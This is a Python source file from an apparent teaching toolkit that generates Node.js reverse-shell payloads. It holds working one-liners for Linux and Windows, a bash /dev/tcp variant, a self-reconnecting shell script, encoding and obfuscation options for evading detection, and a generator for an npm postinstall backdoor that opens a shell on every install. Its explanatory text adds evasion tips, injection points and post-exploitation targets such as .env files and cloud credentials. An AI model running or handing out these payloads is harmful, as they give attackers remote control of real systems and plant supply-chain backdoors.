"""
Node.js reverse shell payload generator
"""

from .base import PayloadGenerator, PayloadConfig, PayloadExplanation
from learnshells.utils.logger import Logger
from typing import Dict


class NodeJSGenerator(PayloadGenerator):
    """Generate Node.js reverse shell payloads."""
# ========== GENERATE METHOD - FIXED ==========
    def generate(self, encode: bool = False, obfuscate: bool = False) -> str:
        """
        Generate Node.js reverse shell payload.
        
        Args:
            encode: Whether to encode
            obfuscate: Whether to obfuscate
            
        Returns:
            Node.js payload string
        """
        # Get lhost and lport from config
        lhost = self.config.lhost
        lport = self.config.lport
        
        # Check if logger exists
        if not hasattr(self, 'logger'):
            self.logger = Logger()
        
        # Generate the reverse shell
        payload = self._generate_reverse_shell()
        
        if obfuscate:
            payload = self._obfuscate(payload)
        
        if encode:
            import base64
            encoded = base64.b64encode(payload.encode()).decode()
            payload = f"node -e 'eval(Buffer.from(\"{encoded}\",\"base64\").toString())'"
        
        self.logger.success(
            f"Generated Node.js payload ({len(payload)} bytes)",
            explain="Node.js is extremely common on modern web servers and perfect for reverse shells. "
                   "It's found on virtually all JavaScript backend servers."
        )
        
        return payload
# ========== REVERSE SHELL METHOD - FIXED ==========
    def _generate_reverse_shell(self) -> str:
        """Generate standard Node.js reverse shell one-liner."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""node -e '(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({lport}, "{lhost}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})()'"""
        return payload

    def _generate_simple_reverse(self) -> str:
        """Generate simple Node.js reverse shell using bash."""
        lhost = self.config.lhost
        lport = self.config.lport
        payload = f"""node -e 'require("child_process").exec("bash -c \\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\'")'"""
        return payload
    
    def _generate_full_reverse(self) -> str:
        """Generate full-featured Node.js reverse shell script."""
        lhost = self.config.lhost
        lport = self.config.lport
        payload = f"""const net = require('net');
const spawn = require('child_process').spawn;
const HOST = '{lhost}';
const PORT = {lport};
function connect() {{
    const client = new net.Socket();
    
    client.connect(PORT, HOST, function() {{
        console.log('Connected to ' + HOST + ':' + PORT);
        
        const sh = spawn('/bin/sh', ['-i']);
        
        client.write('Shell connected!\\n');
        
        // Pipe streams
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        
        sh.on('exit', function(code, signal) {{
            client.end('Shell process exited\\n');
        }});
    }});
    
    client.on('error', function(e) {{
        console.error('Connection error:', e.message);
        setTimeout(connect, 5000); // Reconnect after 5 seconds
    }});
    
    client.on('close', function() {{
        console.log('Connection closed');
        setTimeout(connect, 5000); // Reconnect after 5 seconds
    }});
}}
connect();"""
        return payload
    
    def _generate_windows_reverse(self) -> str:
        """Generate Node.js reverse shell for Windows."""
        lhost = self.config.lhost
        lport = self.config.lport
        payload = f"""node -e '(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("cmd.exe", []);var client = new net.Socket();client.connect({lport}, "{lhost}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}})()'"""
        return payload
    
    def _generate_nodejs_alt_command(self) -> str:
        """Generate payload for systems using 'nodejs' instead of 'node'."""
        lhost = self.config.lhost
        lport = self.config.lport
        payload = f"""nodejs -e '(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({lport}, "{lhost}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}})()'"""
        return payload
    
    def _obfuscate(self, payload: str) -> str:
        """Basic obfuscation for Node.js payload."""
        # String splitting and concatenation
        obfuscated = payload
        obfuscated = obfuscated.replace('require', '["req"+"uire"]')
        obfuscated = obfuscated.replace('"net"', '"n"+"et"')
        obfuscated = obfuscated.replace('"child_process"', '"child_"+"process"')
        return obfuscated
# ========== END ALL METHODS ==========
    def explain(self, payload: str) -> str:
        """
        Explain Node.js payload line by line.
        
        Args:
            payload: Node.js payload
            
        Returns:
            Educational explanation
        """
        explanation = """
🎓 NODE.JS REVERSE SHELL EXPLAINED:

Part 1: Wrap in IIFE (Immediately Invoked Function Expression)
    (function() { ... })()
    Wraps code in anonymous function and executes immediately.
    Keeps variables scoped and avoids polluting global namespace.
    The return /a/; at end is just to satisfy syntax.

Part 2: Import Required Modules
    var net = require("net");
    var cp = require("child_process");
    
    • net: Node's built-in networking module (TCP/UDP sockets)
    • child_process: Module for spawning processes
    • require(): Node's module loading function
    
    Both are core modules - always available, no npm install needed!

Part 3: Spawn Shell Process
    sh = cp.spawn("/bin/sh", []);
    
    Creates a new shell process:
    • cp.spawn(): Asynchronously spawn child process
    • "/bin/sh": Path to shell binary
    • []: Empty array of arguments (we want interactive shell)
    • Returns: ChildProcess object with stdin, stdout, stderr streams

Part 4: Create TCP Socket
    client = new net.Socket();
    
    Creates a new TCP socket object.
    Socket is a duplex stream (both readable and writable).
    This will be our network connection back to attacker.

Part 5: Connect to Listener
    client.connect(PORT, "HOST", function() { ... });
    
    Initiates TCP connection:
    • PORT: Your listener port (e.g., 443)
    • "HOST": Your IP address
    • function(): Callback executed when connection succeeds
    
    This is asynchronous - callback runs when connected.

Part 6: Pipe Streams Together
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    
    The magic of Node.js streams!
    
    Flow 1: You type command → client receives → pipes to sh.stdin → shell executes
    Flow 2: Shell output → sh.stdout → pipes to client → you see output
    Flow 3: Shell errors → sh.stderr → pipes to client → you see errors
    
    .pipe() connects readable stream to writable stream:
    • client is duplex (read/write)
    • sh.stdin is writable only
    • sh.stdout and sh.stderr are readable only

STREAM TYPES:
    Readable: Can read data from (stdout, stderr, file read)
    Writable: Can write data to (stdin, file write)
    Duplex: Can both read and write (sockets, TTY)
    Transform: Special duplex that modifies data

WINDOWS VERSION:
    sh = cp.spawn("cmd.exe", []);
    
    Same concept, different shell:
    • Windows uses cmd.exe instead of /bin/sh
    • Streams work identically
    • Everything else is the same

SIMPLE VERSION (Using bash):
    require("child_process").exec("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")
    
    This version:
    • Uses .exec() instead of .spawn()
    • Executes bash directly with /dev/tcp trick
    • Simpler but less flexible
    • Single line of code

FULL FEATURED VERSION:
Includes additional features:
    • Connection success message
    • Automatic reconnection on error
    • Exit handling for shell process
    • Error logging
    • setTimeout for retry logic

WHY NODE.JS?
✓ Ubiquitous on modern web servers
✓ Built-in on many platforms
✓ Non-blocking async I/O (very fast)
✓ Rich ecosystem (npm)
✓ Cross-platform (Linux/Windows/Mac)
✓ JavaScript is easy to read/modify

WHEN TO USE NODE.JS:
✓ Express.js servers
✓ Next.js applications
✓ NestJS backends
✓ Modern web APIs
✓ Serverless functions (AWS Lambda, etc.)
✓ Electron apps
✓ JavaScript-heavy environments

COMMON NODE.JS LOCATIONS:
• /usr/bin/node
• /usr/local/bin/node
• /usr/bin/nodejs (older Debian/Ubuntu)
• ~/.nvm/versions/node/v*/bin/node (nvm)
• /opt/node/bin/node
• C:\\Program Files\\nodejs\\node.exe (Windows)

NODE VS NODEJS COMMAND:
Some systems use 'nodejs' instead of 'node':
• Debian/Ubuntu historically used 'nodejs'
• Most modern systems use 'node'
• Both work the same way
• Try: node -v or nodejs -v

ADVANTAGES OVER OTHER LANGUAGES:
• More common than Ruby/Perl on modern systems
• Easier syntax than Perl
• Better async handling than Python 2
• Native on JavaScript-based infrastructure
• npm ecosystem is massive

DETECTION & EVASION:
Low Detection:
• Node.js is legitimate on web servers
• Process looks normal (node process)
• Network connection is just TCP

Higher Detection:
• child_process.spawn might be logged
• Some EDR watches for suspicious node usage
• File system access might trigger alerts

Evasion Tips:
• Encode payload with base64
• Obfuscate require() calls
• Use string concatenation
• Hide in legitimate-looking npm package
"""
        return explanation
    
    def generate_variants(self, lhost: str, lport: int) -> dict:
        """
        Generate multiple Node.js payload variants.
        
        Args:
            lhost: Local host IP
            lport: Local port
            
        Returns:
            Dict of payload variants
        """

        self.lhost = lhost
        self.lport = lport
        
        variants = {}
        
        # Standard one-liner
        variants['standard'] = self._generate_reverse_shell()
        
        # Simple bash-based version
        variants['simple'] = self._generate_simple_reverse()
        
        # Full featured script
        variants['full'] = self._generate_full_reverse()
        
        # Windows version
        variants['windows'] = self._generate_windows_reverse()
        
        # Nodejs command (for old Debian/Ubuntu)
        variants['nodejs_cmd'] = self._generate_nodejs_alt_command()
        
        # Base64 encoded
        variants['encoded'] = self.generate(lhost, lport, encode=True)
        
        # Obfuscated
        variants['obfuscated'] = self.generate(lhost, lport, obfuscate=True)
        
        return variants
    
    def get_usage_instructions(self) -> str:
        """Get instructions for using Node.js payloads."""
        instructions = """
📋 NODE.JS PAYLOAD USAGE:

Method 1: Direct Execution
node -e 'YOUR_PAYLOAD'

Method 2: From File
echo 'YOUR_PAYLOAD' > shell.js
node shell.js

Method 3: Command Injection
; node -e '(function(){var net=require("net")...'

Method 4: In Existing Node App
If you can inject into a running Node app:
const net = require('net');
// ... payload code

Method 5: npm/package.json Backdoor
Add to scripts in package.json:
"postinstall": "node -e 'YOUR_PAYLOAD'"

CHECKING AVAILABILITY:
# Check if Node.js is installed
which node
node --version

# Alternative command name
which nodejs
nodejs --version

# Check npm (usually comes with Node)
npm --version

COMMON LOCATIONS:
/usr/bin/node
/usr/local/bin/node
/usr/bin/nodejs
~/.nvm/versions/node/*/bin/node

TIPS:
• Use -e flag for inline code execution
• Single quotes prevent shell interpretation
• Try both 'node' and 'nodejs' commands
• Check Node version: node -v

PAYLOAD SELECTION GUIDE:
Standard: Best for most Linux systems (one-liner)
Simple: Shortest payload, uses bash
Full: Feature-rich with auto-reconnect
Windows: For Windows systems with Node
Encoded: For WAF/filter bypass
Obfuscated: For signature evasion

FRAMEWORK-SPECIFIC INJECTION:

Express.js:
app.get('/exploit', (req, res) => {
    require('child_process').exec('YOUR_PAYLOAD');
});

Next.js API Route:
export default function handler(req, res) {
    require('child_process').exec('YOUR_PAYLOAD');
}

Serverless Function:
exports.handler = async (event) => {
    require('child_process').exec('YOUR_PAYLOAD');
};

TROUBLESHOOTING:
Issue: "node: command not found"
Fix: Try 'nodejs' or install Node.js

Issue: "Cannot find module 'net'"
Fix: net is built-in, check Node installation

Issue: Connection fails immediately
Fix: Check firewall, use different port (443, 80)

Issue: Shell doesn't spawn
Fix: Try /bin/bash instead of /bin/sh

Issue: On Windows, shell not working
Fix: Use Windows variant with cmd.exe

ADVANTAGES:
✓ Very common on modern systems
✓ Non-blocking I/O (fast and efficient)
✓ Cross-platform compatibility
✓ Easy to obfuscate (JavaScript)
✓ Large ecosystem (npm)
✓ Legitimate process name

USE CASES:
✓ Modern web applications (Express, Next.js, NestJS)
✓ REST APIs
✓ GraphQL servers
✓ Websocket servers
✓ Serverless functions (Lambda, Cloud Functions)
✓ Build systems (Webpack, Vite, etc.)
✓ Development environments
✓ Electron applications
✓ CI/CD pipelines

DETECTION NOTES:
Low Risk:
• Node process is legitimate on web servers
• TCP connections are normal
• Built-in modules don't raise flags

Medium Risk:
• child_process usage might be logged
• Unusual network connections monitored
• Some EDR solutions watch Node.js spawning

High Risk:
• Multiple failed connection attempts
• Connections to known attacker IPs
• Process injection attempts
"""
        return instructions
    
    def test_availability(self) -> str:
        """Generate command to test if Node.js is available on target."""
        test_cmd = "which node || which nodejs && node --version 2>/dev/null || nodejs --version"
        
        self.logger.info(
            "Node.js availability test command generated",
            explain="This checks for both 'node' and 'nodejs' commands and shows version if found."
        )
        
        return test_cmd
    
    def get_framework_specific_notes(self) -> str:
        """Get framework-specific exploitation notes."""
        notes = """
NODE.JS FRAMEWORK EXPLOITATION:

Express.js:
Common in: REST APIs, web servers
Injection points:
• Route handlers: app.get(), app.post()
• Middleware functions
• Template engines (EJS, Pug)
• Query parameters via req.query
• Body parameters via req.body

Next.js:
Common in: Full-stack React apps
Injection points:
• API routes (/pages/api/*)
• getServerSideProps
• getStaticProps
• Middleware
• Server components (App Router)

NestJS:
Common in: Enterprise Node backends
Injection points:
• Controllers
• Services
• Guards
• Interceptors
• Pipes

Socket.io:
Common in: Real-time applications
Injection points:
• Socket event handlers
• Room broadcasts
• Namespace handlers

Electron:
Common in: Desktop applications
Injection points:
• IPC handlers (ipcMain)
• WebView components
• Node integration contexts

COMMON VULNERABLE PATTERNS:
1. Unsafe eval():
   eval(userInput) // DANGEROUS

2. child_process with user input:
   exec(userInput) // DANGEROUS
   
3. Template injection:
   template.render(userInput) // CAN BE DANGEROUS

4. Deserialization:
   JSON.parse(untrustedData) // CAN BE DANGEROUS
   
5. Code generation:
   new Function(userInput) // DANGEROUS

POST-EXPLOITATION:
Once you have shell, look for:
• package.json (dependencies, scripts)
• .env files (secrets, API keys)
• node_modules/ (installed packages)
• Database connection strings
• JWT secrets
• AWS credentials
• Docker secrets

Interesting Files:
• /app/package.json
• /app/.env
• /app/config/*
• /home/node/.npmrc
• /root/.npmrc
"""
        return notes
    
    def generate_npm_backdoor(self, lhost: str, lport: int) -> dict:
        """Generate npm package backdoor for persistence."""
        package_json = {
            "name": "backdoor-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": f"node -e '(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({lport},\"{lhost}\",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}})()'"
            }
        }
        
        self.logger.info(
            "Generated npm backdoor package.json",
            explain="This package.json includes a postinstall script that triggers a reverse shell. "
                   "When anyone runs 'npm install', the shell connects back automatically."
        )
        
        return package_json
        
# ========== TEST REQUIREMENTS METHOD ==========
    def test_requirements(self, target_info: Dict) -> bool:
        """
        Test if target meets requirements for Node.js payload.
        
        Args:
            target_info: Target information dictionary
            
        Returns:
            True if requirements met
        """
        # Check if Node.js/JavaScript is detected
        if 'technologies' in target_info:
            techs = target_info.get('technologies', [])
            if any(tech.lower() in ['nodejs', 'node.js', 'node', 'javascript', 'express'] for tech in techs):
                return True
        
        # Check web server for Node hints
        web_server = target_info.get('web_server', '').lower()
        if 'node' in web_server or 'express' in web_server:
            return True
        
        # Node.js is becoming very common
        return True
# ========== END TEST REQUIREMENTS ==========
